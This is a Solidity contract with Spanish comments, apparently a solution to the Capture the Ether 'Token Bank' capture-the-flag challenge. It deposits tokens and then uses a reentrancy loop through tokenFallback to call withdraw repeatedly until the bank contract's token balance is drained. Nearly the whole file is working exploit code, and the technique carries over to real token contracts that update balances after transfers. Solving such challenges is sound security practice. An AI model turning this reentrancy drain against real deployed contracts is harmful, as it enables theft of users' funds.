pragma solidity 0.7.3;

// Para evitar que explote todito
abstract contract ITokenBankChallenge {
    ISimpleERC223Token public token;
    mapping(address => uint256) public balanceOf;

    function isComplete() external view virtual returns (bool);

    function withdraw(uint256 amount) external virtual;
}

abstract contract ISimpleERC223Token {
    // Track how many tokens are owned by each address.
    mapping(address => uint256) public balanceOf;

    function transfer(address to, uint256 value)
        external
        virtual
        returns (bool success);
}

contract DosCompletosDesconocidos {
    address public TOKEN_BANK_CHALLENGE_ADDRESS = 0x4Eea8772504eA7BB644a6Bc62263EbA4D0503fD4;
    ITokenBankChallenge public tokenBankchallenge;

    constructor() {
        tokenBankchallenge = ITokenBankChallenge(TOKEN_BANK_CHALLENGE_ADDRESS);
    }

    function depositarSaldoObtenidoDeEOA() external payable {
        uint256 myBalance = tokenBankchallenge.token().balanceOf(address(this));
        // El deposito interactúa con la función tokenFallback en tokenBankChallenge
        tokenBankchallenge.token().transfer(address(tokenBankchallenge), myBalance);
    }

    function atacar() external payable {
        invocarWithdraw();
        // Ponemos un require acá para que en caso que algo salga mal y el challenge no se complete, no desperdiciemos eth en gas ni la caguemos con el contracto de tokenBank
        require(tokenBankchallenge.isComplete(), "DESAFIO INCOMPLETO. APLICANDO REVERT...");
    }

    function tokenFallback(address from, uint256 value, bytes calldata) external {
        require(msg.sender == address(tokenBankchallenge.token()));
        invocarWithdraw();

         // Cuando la EOA deposita, ignorar
        if (from != address(tokenBankchallenge)) return;
    }

    function invocarWithdraw() private {
        // Nuestro balance inicial para poder hacer el primer withdraw (y también sucesivamente hasta que haya menos que esta cantidad en el contrato tokenBank)
        uint256 myInitialBalance = tokenBankchallenge.balanceOf(address(this));
        
        // Averiguamos lo que va quedando en el balance del contrato tokenBank
        uint256 tokenBankchallengeRemanenteEnBalance =
            tokenBankchallenge.token().balanceOf(address(tokenBankchallenge));

        // Si siguen quedando tokens en el balance, seguimos invocando a withdraw hasta dejalo vacío.
        if (tokenBankchallengeRemanenteEnBalance > 0) {
            //Vamos retirando siempre nuestro balance inicial hasta que haya menos que eso. Si hay menos, retiramos el remanente entero. Tranquilamente se podría haber extraído de a 1 token, pero recordar que con esto estamos gastando gas, por lo que queremos la menor cantidad de transacciones posibles.
            if (myInitialBalance < tokenBankchallengeRemanenteEnBalance){
                tokenBankchallenge.withdraw(myInitialBalance);
            } else {
                tokenBankchallenge.withdraw(tokenBankchallengeRemanenteEnBalance);
            }
        }
    }
}